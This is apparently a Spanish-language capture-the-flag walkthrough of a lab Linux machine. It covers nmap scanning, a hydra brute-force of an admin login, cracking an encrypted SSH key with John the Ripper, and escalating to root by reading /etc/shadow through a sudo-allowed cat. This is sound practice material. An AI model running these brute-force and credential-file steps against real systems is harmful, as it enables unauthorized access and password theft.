# Summary
- IP: 10.10.220.132
- Ports: 22,80
- OS: Linux (Ubuntu)
- Services & Applications:
	-  22 -> OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
	-  80 -> Apache httpd 2.4.29

# Recon

- Escaneo básico de puertos:

```
$sudo nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.10.220.132 -oG allPorts
```


- Escaneo profundo de puertos encontrados:

```
$sudo nmap -p21,80,2222 -sCV 10.10.129.26 -oN targeted
```

- Escaneo básico de directorios web:

```
#nmap --script http-enum -p80 10.10.220.132 -oN webSCan
```

- Encontramos el directorio "/admin" lo examinamos y vemos una página de logeo, analizando el código fuente encontramos el usuario "admin", hacemos ataque de fuerza bruta al login usando el usuario encontrado:

```
#hydra -l admin -P /home/dante/SecLists/Passwords/Leaked-Databases/rockyou.txt 10.10.220.132 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:Username or password invalid"
```

- Encontramos la contraseña para el usuario "admin" accedemos y vemos un mensaje que nos redirige a un "id_rsa" el cual contiene la clave privada SSH encriptada del usuario "john", la crackeamos con john:

```
#nano id_rsa

#chmod 600 id_rsa

#/usr/share/john/ssh2john.py id_rsa > id_rsa.txt

#john -w:/home/dante/SecLists/Passwords/Leaked-Databases/rockyou.txt id_rsa.txt
```

- Ecnontramos la contraseña para el usuario "john", accedemos via SSH usando el archivo rsa:

```
#ssh -i id_rsa jhon@10.10.220.132
```

- Encontramos la primera flag.

# ESCALANDO PRIVILEGIOS:


- Buscamos binarios con permisos de ejecutar como root sin contraseña:

```
$sudo -l
```

- Encontramos el binario "cat", aprovechamos para leer el archivo "/etc/shadow":

```
$sudo cat /etc/shadow
```

- Copiar en un archivo el contenido del archivo shadows e intentar crackear contraseñas de usuarios con john:

```
nano shadow

john shadow
```


- Encontramos la contraseña de root, accedemos y encontramos la última flag.
